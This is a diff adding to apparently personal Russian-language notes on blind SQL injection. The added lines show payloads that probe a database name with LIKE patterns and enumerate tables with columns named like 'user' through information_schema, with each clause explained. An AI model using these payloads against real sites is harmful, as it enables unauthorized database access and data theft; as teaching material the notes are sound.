@@ -120,6 +120,25 @@ Ex: 'something.com' LIKE '%thing%' - true.
     'something.com' LIKE '%.c' - false.
 
     'test.com' LIKE '___t.c__' - true.
+    'test.com' LIKE '___t.c_' - false.
+SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '%n%')
+SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() LIKE '_______')
+SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE database() = 'name_bd')
+
+Получение имен таблиц через столбцы.
+SELECT title, descr, body FROM something WHERE id=$id AND (SELECT 1 FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1) LIKE '%')
+
+Запрос состоит из 2х вложенных запросов
+1. SELECT table_name FROM information_schema.columns WHERE table_schema = database() AND column_name LIKE '%user%' limit 0,1
+    SELECT table_name - выдай имя таблицы.
+    FROM information_schema.columns - из данных колонок.
+    WHERE table_schema = database() - где, БД равна текущей.
+    AND column_name LIKE '%user%' - и таблица содержит столбец в названии которого есть user.
+    limit 0,1 - 1шт
+
+
+
+
 
 
 
